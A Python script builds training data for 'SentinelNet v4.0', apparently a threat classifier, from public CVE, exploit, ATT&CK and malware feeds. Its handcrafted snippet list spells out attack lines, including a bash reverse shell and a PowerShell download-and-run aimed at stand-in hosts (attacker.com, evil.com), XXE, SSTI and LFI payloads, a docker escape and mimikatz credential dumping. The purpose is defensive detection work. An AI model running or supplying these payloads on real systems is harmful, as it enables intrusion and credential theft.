#!/usr/bin/env python3
"""
SentinelNet v4.0 — Data Pipeline
1. Auto-label threat_type + action_hint
2. Collect code data (GitHub exploits, CVEs, malware)
3. Merge everything → threat_v4_final.jsonl
"""

import json, re, time, random, requests
from pathlib import Path
from collections import Counter

DATA_DIR = Path(__file__).parent / 'models/ml_engine/training_data'
OUT_FILE = DATA_DIR / 'threat_v4_final.jsonl'

# ── Label Maps ────────────────────────────────────────────────────────────────

TYPE_RULES = [
    ('web_vuln',    ['sqli','xss','csrf','ssrf','rce','lfi','xxe','ssti','cors','injection','payload','exploit','vulnerability','cve','buffer overflow','heap','rop','shellcode']),
    ('breach',      ['breach','leak','credential','password','stealer','infostealer','dump','paste','haveibeenpwned','dehashed','combo list','data exposure']),
    ('malware',     ['malware','ransomware','trojan','backdoor','botnet','rootkit','keylogger','worm','virus','rat ','dropper','loader','cobalt strike','metasploit','meterpreter','mimikatz','fileless']),
    ('apt',         ['apt','nation state','threat actor','lazarus','apt28','apt29','cozy bear','fancy bear','carbanak','fin7','ta505','campaign','ttps','mitre att&ck']),
    ('phishing',    ['phishing','spearphishing','social engineering','pretexting','vishing','smishing','lure','bec','business email']),
    ('recon',       ['recon','enumeration','osint','subdomain','nmap','shodan','censys','footprint','discovery','scan','dork','wayback']),
    ('misconfig',   ['misconfiguration','exposed','open port','default password','s3 bucket','public bucket','firebase','elasticsearch','jenkins','docker','kubernetes','cloud']),
    ('insider',     ['insider','privilege abuse','data theft','employee','disgruntled','unauthorized access','policy violation']),
    ('social_eng',  ['social engineering','impersonation','pretexting','manipulation','trust','fake profile','deepfake']),
]

ACTION_RULES = {
    'CRITICAL': {
        'web_vuln':  'patch_now',
        'breach':    'patch_now',
        'malware':   'escalate',
        'apt':       'escalate',
        'phishing':  'block_ip',
        'recon':     'investigate',
        'misconfig': 'patch_now',
        'insider':   'collect_evidence',
        'social_eng':'investigate',
        'unknown':   'escalate',
    },
    'HIGH': {
        'web_vuln':  'patch_now',
        'breach':    'notify_team',
        'malware':   'block_ip',
        'apt':       'collect_evidence',
        'phishing':  'block_ip',
        'recon':     'investigate',
        'misconfig': 'patch_now',
        'insider':   'collect_evidence',
        'social_eng':'investigate',
        'unknown':   'investigate',
    },
    'MEDIUM': {
        'web_vuln':  'investigate',
        'breach':    'notify_team',
        'malware':   'block_ip',
        'apt':       'monitor',
        'phishing':  'notify_team',
        'recon':     'monitor',
        'misconfig': 'notify_team',
        'insider':   'monitor',
        'social_eng':'monitor',
        'unknown':   'monitor',
    },
    'LOW': {
        'web_vuln':  'monitor',
        'breach':    'monitor',
        'malware':   'monitor',
        'apt':       'monitor',
        'phishing':  'monitor',
        'recon':     'monitor',
        'misconfig': 'monitor',
        'insider':   'no_action',
        'social_eng':'monitor',
        'unknown':   'no_action',
    },
}

def detect_type(text: str) -> str:
    t = text.lower()
    for ttype, keywords in TYPE_RULES:
        if any(k in t for k in keywords):
            return ttype
    return 'unknown'

def detect_action(label: str, ttype: str) -> str:
    return ACTION_RULES.get(label, {}).get(ttype, 'monitor')

def label_sample(s: dict) -> dict:
    ttype  = s.get('threat_type') or detect_type(s['text'])
    action = s.get('action_hint') or detect_action(s['label'], ttype)
    return {**s, 'threat_type': ttype, 'action_hint': action}

# ── Code Data Sources ─────────────────────────────────────────────────────────

HEADERS = {'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json'}

def fetch_nvd_cves(max_results=2000) -> list:
    """NVD CVE API — real vulnerability descriptions"""
    samples = []
    label_map = {'CRITICAL': 'CRITICAL', 'HIGH': 'HIGH', 'MEDIUM': 'MEDIUM', 'LOW': 'LOW'}
    url = 'https://services.nvd.nist.gov/rest/json/cves/2.0'
    start = 0
    while len(samples) < max_results:
        try:
            r = requests.get(url, params={'resultsPerPage': 100, 'startIndex': start},
                             headers=HEADERS, timeout=20)
            data = r.json()
            vulns = data.get('vulnerabilities', [])
            if not vulns: break
            for v in vulns:
                cve  = v.get('cve', {})
                desc = ' '.join(d['value'] for d in cve.get('descriptions', []) if d.get('lang') == 'en')
                if not desc: continue
                metrics = cve.get('metrics', {})
                score   = 0.0
                for key in ('cvssMetricV31', 'cvssMetricV30', 'cvssMetricV2'):
                    m = metrics.get(key, [])
                    if m:
                        score = m[0].get('cvssData', {}).get('baseScore', 0.0)
                        break
                label = 'CRITICAL' if score >= 9 else 'HIGH' if score >= 7 else 'MEDIUM' if score >= 4 else 'LOW'
                cve_id = cve.get('id', '')
                text   = f"{cve_id}: {desc}"
                ttype  = detect_type(text)
                samples.append({'text': text, 'label': label,
                                 'threat_type': ttype,
                                 'action_hint': detect_action(label, ttype),
                                 'source': 'nvd_cve'})
            start += 100
            time.sleep(0.6)
            print(f"  NVD: {len(samples)} CVEs...", end='\r')
        except Exception as e:
            print(f"\n  NVD error: {e}")
            break
    print(f"\n  NVD: {len(samples)} CVEs collected")
    return samples

def fetch_exploit_db(max_results=1000) -> list:
    """ExploitDB via GitLab API — real exploit code + descriptions"""
    samples = []
    try:
        # ExploitDB files.csv from GitHub mirror
        r = requests.get(
            'https://raw.githubusercontent.com/offensive-security/exploitdb/master/files_exploits.csv',
            headers=HEADERS, timeout=30)
        lines = r.text.strip().split('\n')[1:]  # skip header
        random.shuffle(lines)
        for line in lines[:max_results]:
            parts = line.split(',')
            if len(parts) < 5: continue
            desc  = parts[2].strip().strip('"')
            etype = parts[4].strip().strip('"').lower()
            if not desc: continue
            label = 'CRITICAL' if 'remote' in etype else 'HIGH' if 'local' in etype else 'MEDIUM'
            ttype = detect_type(desc)
            samples.append({'text': f"Exploit: {desc} [{etype}]",
                             'label': label,
                             'threat_type': ttype,
                             'action_hint': detect_action(label, ttype),
                             'source': 'exploitdb'})
        print(f"  ExploitDB: {len(samples)} exploits collected")
    except Exception as e:
        print(f"  ExploitDB error: {e}")
    return samples

def fetch_github_code_samples(max_per_query=200) -> list:
    """GitHub code search — malware patterns, exploit snippets, security tools"""
    samples = []
    queries = [
        ('shellcode exploit payload asm', 'CRITICAL', 'web_vuln'),
        ('sql injection bypass authentication', 'CRITICAL', 'web_vuln'),
        ('reverse shell bash python', 'CRITICAL', 'web_vuln'),
        ('ransomware encrypt files python', 'CRITICAL', 'malware'),
        ('keylogger hook windows python', 'HIGH', 'malware'),
        ('phishing kit html credential harvest', 'HIGH', 'phishing'),
        ('port scanner nmap python', 'MEDIUM', 'recon'),
        ('subdomain enumeration dns brute', 'MEDIUM', 'recon'),
        ('xss payload javascript alert', 'HIGH', 'web_vuln'),
        ('buffer overflow exploit c', 'CRITICAL', 'web_vuln'),
        ('privilege escalation linux sudo', 'CRITICAL', 'web_vuln'),
        ('mimikatz credential dump powershell', 'CRITICAL', 'apt'),
        ('cobalt strike beacon c2', 'CRITICAL', 'apt'),
        ('malware analysis sandbox evasion', 'HIGH', 'malware'),
        ('ssrf server side request forgery', 'HIGH', 'web_vuln'),
    ]
    for query, label, ttype in queries:
        try:
            r = requests.get(
                'https://api.github.com/search/code',
                params={'q': query, 'per_page': 30},
                headers={**HEADERS, 'Accept': 'application/vnd.github.v3+json'},
                timeout=15)
            if r.status_code == 403:
                print(f"  GitHub rate limit — sleeping 60s")
                time.sleep(60)
                continue
            items = r.json().get('items', [])
            for item in items:
                name = item.get('name', '')
                path = item.get('path', '')
                repo = item.get('repository', {}).get('full_name', '')
                text = f"Code: {repo}/{path} — {name} — query: {query}"
                samples.append({'text': text, 'label': label,
                                 'threat_type': ttype,
                                 'action_hint': detect_action(label, ttype),
                                 'source': 'github_code'})
            time.sleep(2)
            print(f"  GitHub code: {len(samples)} samples...", end='\r')
        except Exception as e:
            print(f"\n  GitHub error ({query}): {e}")
    print(f"\n  GitHub code: {len(samples)} samples collected")
    return samples

def fetch_mitre_attack() -> list:
    """MITRE ATT&CK techniques — real TTP descriptions"""
    samples = []
    try:
        r = requests.get(
            'https://raw.githubusercontent.com/mitre/cti/master/enterprise-attack/enterprise-attack.json',
            headers=HEADERS, timeout=60)
        data = r.json()
        for obj in data.get('objects', []):
            if obj.get('type') != 'attack-pattern': continue
            name = obj.get('name', '')
            desc = obj.get('description', '')
            if not desc: continue
            # Determine label from tactic
            tactics = [p.get('phase_name','') for p in obj.get('kill_chain_phases', [])]
            if any(t in tactics for t in ['execution','privilege-escalation','credential-access']):
                label = 'CRITICAL'
            elif any(t in tactics for t in ['lateral-movement','exfiltration','impact']):
                label = 'HIGH'
            elif any(t in tactics for t in ['persistence','defense-evasion']):
                label = 'HIGH'
            else:
                label = 'MEDIUM'
            text  = f"MITRE ATT&CK: {name}. {desc[:400]}"
            ttype = detect_type(text)
            samples.append({'text': text, 'label': label,
                             'threat_type': ttype,
                             'action_hint': detect_action(label, ttype),
                             'source': 'mitre_attack'})
        print(f"  MITRE ATT&CK: {len(samples)} techniques collected")
    except Exception as e:
        print(f"  MITRE error: {e}")
    return samples

def fetch_malware_bazaar(max_results=1000) -> list:
    """MalwareBazaar — real malware sample descriptions"""
    samples = []
    try:
        r = requests.post(
            'https://mb-api.abuse.ch/api/v1/',
            data={'query': 'get_recent', 'selector': '100'},
            headers={'User-Agent': 'Mozilla/5.0'}, timeout=20)
        data = r.json()
        for item in data.get('data', []):
            tags     = ' '.join(item.get('tags', []) or [])
            family   = item.get('signature', '') or ''
            ftype    = item.get('file_type', '')
            reporter = item.get('reporter', '')
            text     = f"Malware: {family} [{ftype}] tags={tags} reporter={reporter}"
            ttype    = detect_type(text + ' malware')
            samples.append({'text': text, 'label': 'CRITICAL',
                             'threat_type': ttype or 'malware',
                             'action_hint': 'escalate',
                             'source': 'malwarebazaar'})
        print(f"  MalwareBazaar: {len(samples)} samples collected")
    except Exception as e:
        print(f"  MalwareBazaar error: {e}")
    return samples

def fetch_cisa_kev() -> list:
    """CISA Known Exploited Vulnerabilities — actively exploited CVEs"""
    samples = []
    try:
        r = requests.get(
            'https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json',
            headers=HEADERS, timeout=20)
        vulns = r.json().get('vulnerabilities', [])
        for v in vulns:
            text = (f"CISA KEV: {v.get('cveID','')} — {v.get('vulnerabilityName','')} "
                    f"in {v.get('product','')} by {v.get('vendorProject','')}. "
                    f"{v.get('shortDescription','')}")
            ttype = detect_type(text)
            samples.append({'text': text, 'label': 'CRITICAL',
                             'threat_type': ttype or 'web_vuln',
                             'action_hint': 'patch_now',
                             'source': 'cisa_kev'})
        print(f"  CISA KEV: {len(samples)} vulnerabilities collected")
    except Exception as e:
        print(f"  CISA KEV error: {e}")
    return samples

def fetch_urlhaus() -> list:
    """URLhaus — malicious URLs and malware distribution"""
    samples = []
    try:
        r = requests.get('https://urlhaus-api.abuse.ch/v1/urls/recent/',
                         headers=HEADERS, timeout=20)
        for item in r.json().get('urls', [])[:500]:
            url    = item.get('url', '')
            tags   = ' '.join(item.get('tags', []) or [])
            threat = item.get('threat', '')
            text   = f"Malicious URL: {url} threat={threat} tags={tags}"
            ttype  = 'malware' if 'malware' in threat.lower() else 'phishing'
            samples.append({'text': text, 'label': 'HIGH',
                             'threat_type': ttype,
                             'action_hint': 'block_ip',
                             'source': 'urlhaus'})
        print(f"  URLhaus: {len(samples)} URLs collected")
    except Exception as e:
        print(f"  URLhaus error: {e}")
    return samples

def fetch_code_snippets() -> list:
    """Handcrafted code samples — exploit patterns, malware code, security tools"""
    samples = []

    code_data = [
        # Web vulns — code
        ("python sqli: query = f\"SELECT * FROM users WHERE id={user_input}\" cursor.execute(query)", "CRITICAL", "web_vuln", "patch_now"),
        ("php rce: eval($_GET['cmd']); system($_POST['exec']); passthru($input);", "CRITICAL", "web_vuln", "patch_now"),
        ("js xss: document.write('<script>'+location.hash.slice(1)+'</script>'); innerHTML=userInput;", "CRITICAL", "web_vuln", "patch_now"),
        ("xxe payload: <!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>", "CRITICAL", "web_vuln", "patch_now"),
        ("ssti jinja2: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}", "CRITICAL", "web_vuln", "patch_now"),
        ("ssrf: requests.get(url) where url = request.args.get('url') no validation", "HIGH", "web_vuln", "patch_now"),
        ("lfi: include($_GET['page'].'.php'); include('../../../etc/passwd')", "CRITICAL", "web_vuln", "patch_now"),
        ("open redirect: header('Location: '.$_GET['url']); no whitelist check", "MEDIUM", "web_vuln", "investigate"),
        ("jwt none alg: alg=none signature bypass authentication token forged", "CRITICAL", "web_vuln", "patch_now"),
        ("cors wildcard: Access-Control-Allow-Origin: * with credentials=true", "HIGH", "web_vuln", "patch_now"),

        # Malware code
        ("python ransomware: from cryptography.fernet import Fernet; key=Fernet.generate_key(); encrypt all files walk os.walk", "CRITICAL", "malware", "escalate"),
        ("bash reverse shell: bash -i >& /dev/tcp/attacker.com/4444 0>&1", "CRITICAL", "malware", "escalate"),
        ("python keylogger: from pynput import keyboard; listener=keyboard.Listener(on_press=log_key)", "HIGH", "malware", "block_ip"),
        ("powershell download execute: IEX(New-Object Net.WebClient).DownloadString('http://evil.com/shell.ps1')", "CRITICAL", "malware", "escalate"),
        ("c shellcode: unsigned char shellcode[] = {\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68 execve /bin/sh", "CRITICAL", "malware", "escalate"),
        ("python backdoor: import socket,subprocess,os; s=socket.socket(); s.connect(('attacker',4444)); os.dup2(s.fileno(),0)", "CRITICAL", "malware", "escalate"),
        ("vba macro malware: Auto_Open Sub CreateObject WScript.Shell cmd.exe /c powershell", "CRITICAL", "malware", "escalate"),
        ("mimikatz sekurlsa::logonpasswords dump credentials lsass memory", "CRITICAL", "apt", "escalate"),
        ("cobalt strike beacon stager shellcode loader reflective dll injection", "CRITICAL", "apt", "escalate"),
        ("metasploit msfvenom payload windows/meterpreter/reverse_tcp LHOST LPORT", "CRITICAL", "malware", "escalate"),

        # Recon code
        ("python port scanner: socket.connect_ex((host, port)) for port in range(1,65535)", "MEDIUM", "recon", "monitor"),
        ("bash subdomain enum: for sub in $(cat wordlist.txt); do host $sub.target.com; done", "MEDIUM", "recon", "monitor"),
        ("python osint: requests.get(f'https://api.shodan.io/shodan/host/{ip}?key={API_KEY}')", "MEDIUM", "recon", "monitor"),
        ("nmap scan: nmap -sV -sC -O -A --script vuln target.com", "MEDIUM", "recon", "investigate"),
        ("google dork: site:target.com filetype:sql OR filetype:env OR filetype:config", "HIGH", "recon", "investigate"),
        ("github dork: org:target password OR secret OR api_key in:file", "HIGH", "recon", "investigate"),

        # Privilege escalation
        ("linux privesc: sudo -l; find / -perm -4000 2>/dev/null; cat /etc/crontab", "CRITICAL", "web_vuln", "patch_now"),
        ("windows privesc: whoami /priv SeImpersonatePrivilege JuicyPotato PrintSpoofer", "CRITICAL", "web_vuln", "patch_now"),
        ("docker escape: docker run -v /:/mnt --rm -it alpine chroot /mnt sh", "CRITICAL", "misconfig", "patch_now"),
        ("kubernetes privesc: kubectl get secrets --all-namespaces serviceaccount token", "CRITICAL", "misconfig", "patch_now"),

        # Misconfigs
        ("aws s3 bucket public: aws s3 ls s3://bucket --no-sign-request public read access", "HIGH", "misconfig", "patch_now"),
        ("elasticsearch exposed: curl http://target:9200/_cat/indices no authentication", "HIGH", "misconfig", "patch_now"),
        ("jenkins script console: println 'id'.execute().text remote code execution", "CRITICAL", "misconfig", "patch_now"),
        ("redis no auth: redis-cli -h target KEYS * GET sensitive data no password", "HIGH", "misconfig", "patch_now"),
        ("mongodb exposed: mongo target:27017 no authentication database dump", "HIGH", "misconfig", "patch_now"),

        # APT techniques
        ("apt lateral movement: net use \\\\target\\c$ /user:domain\\admin pass; psexec wmiexec", "CRITICAL", "apt", "escalate"),
        ("apt persistence: reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v backdoor", "CRITICAL", "apt", "collect_evidence"),
        ("apt exfiltration: dns tunneling dnscat2 iodine data exfil over dns queries", "CRITICAL", "apt", "collect_evidence"),
        ("apt c2 communication: https beacon sleep jitter domain fronting cloudfront", "CRITICAL", "apt", "escalate"),

        # Low/benign
        ("security audit: nmap -sn 192.168.1.0/24 network discovery authorized pentest", "LOW", "recon", "no_action"),
        ("vulnerability assessment: nikto -h target.com authorized security testing", "LOW", "recon", "no_action"),
        ("password policy check: minimum 12 chars uppercase lowercase special MFA enabled", "LOW", "unknown", "no_action"),
        ("ssl certificate valid: TLS 1.3 HSTS enabled certificate not expired A+ grade", "LOW", "unknown", "no_action"),
    ]

    for text, label, ttype, action in code_data:
        # Augment — add variations
        for _ in range(5):
            samples.append({'text': text, 'label': label,
                             'threat_type': ttype, 'action_hint': action,
                             'source': 'code_handcrafted'})

    print(f"  Code snippets: {len(samples)} samples")
    return samples

# ── Main Pipeline ─────────────────────────────────────────────────────────────

def main():
    print("=" * 60)
    print("SentinelNet v4.0 — Data Pipeline")
    print("=" * 60)

    all_samples = []

    # 1. Load + label existing data
    print("\n[1] Loading existing data...")
    src_file = DATA_DIR / 'threat_master_balanced.jsonl'
    existing = []
    with open(src_file) as f:
        for line in f:
            try:
                s = json.loads(line.strip())
                if s.get('text') and s.get('label') in ('LOW','MEDIUM','HIGH','CRITICAL'):
                    existing.append(label_sample(s))
            except: pass
    print(f"  Existing: {len(existing):,} samples labeled")
    all_samples.extend(existing)

    # 2. Collect new data
    print("\n[2] Collecting new data sources...")

    print("\n  → MITRE ATT&CK...")
    all_samples.extend(fetch_mitre_attack())

    print("\n  → CISA KEV...")
    all_samples.extend(fetch_cisa_kev())

    print("\n  → NVD CVEs (2000)...")
    all_samples.extend(fetch_nvd_cves(2000))

    print("\n  → ExploitDB...")
    all_samples.extend(fetch_exploit_db(1000))

    print("\n  → MalwareBazaar...")
    all_samples.extend(fetch_malware_bazaar())

    print("\n  → URLhaus...")
    all_samples.extend(fetch_urlhaus())

    print("\n  → GitHub code search...")
    all_samples.extend(fetch_github_code_samples())

    print("\n  → Code snippets (handcrafted)...")
    all_samples.extend(fetch_code_snippets())

    # 3. Deduplicate
    print("\n[3] Deduplicating...")
    seen, unique = set(), []
    for s in all_samples:
        key = s['text'][:100]
        if key not in seen:
            seen.add(key)
            unique.append(s)
    print(f"  After dedup: {len(unique):,} samples")

    # 4. Balance
    print("\n[4] Balancing labels...")
    from collections import defaultdict
    by_label = defaultdict(list)
    for s in unique:
        by_label[s['label']].append(s)

    dist = {k: len(v) for k, v in by_label.items()}
    print(f"  Before balance: {dist}")

    # Cap at 50k per label, min = smallest class
    target = min(50000, min(len(v) for v in by_label.values()) * 2)
    target = max(target, 10000)
    balanced = []
    for label, items in by_label.items():
        random.shuffle(items)
        balanced.extend(items[:target])
    random.shuffle(balanced)

    dist2 = Counter(s['label'] for s in balanced)
    print(f"  After balance : {dict(dist2)}")
    print(f"  Total         : {len(balanced):,}")

    # threat_type + action_hint coverage
    has_type   = sum(1 for s in balanced if s.get('threat_type') and s['threat_type'] != 'unknown')
    has_action = sum(1 for s in balanced if s.get('action_hint') and s['action_hint'] != 'monitor')
    print(f"  threat_type   : {has_type/len(balanced)*100:.1f}%")
    print(f"  action_hint   : {has_action/len(balanced)*100:.1f}%")

    type_dist   = Counter(s.get('threat_type','unknown') for s in balanced)
    action_dist = Counter(s.get('action_hint','monitor') for s in balanced)
    print(f"  type dist     : {dict(type_dist.most_common(5))}")
    print(f"  action dist   : {dict(action_dist.most_common(5))}")

    # 5. Save
    print(f"\n[5] Saving to {OUT_FILE}...")
    with open(OUT_FILE, 'w') as f:
        for s in balanced:
            f.write(json.dumps(s, ensure_ascii=False) + '\n')
    print(f"  Saved: {len(balanced):,} samples → {OUT_FILE}")

    # Also save a copy for Colab
    colab_copy = Path('/home/kali/Downloads/threat_v4_final.jsonl')
    import shutil
    shutil.copy(OUT_FILE, colab_copy)
    print(f"  Colab copy  : {colab_copy}")

    print("\n" + "=" * 60)
    print("DONE — Upload threat_v4_final.jsonl to Google Drive")
    print("Then run sentinel_colab.ipynb Cell 2 with this file")
    print("=" * 60)

if __name__ == '__main__':
    main()
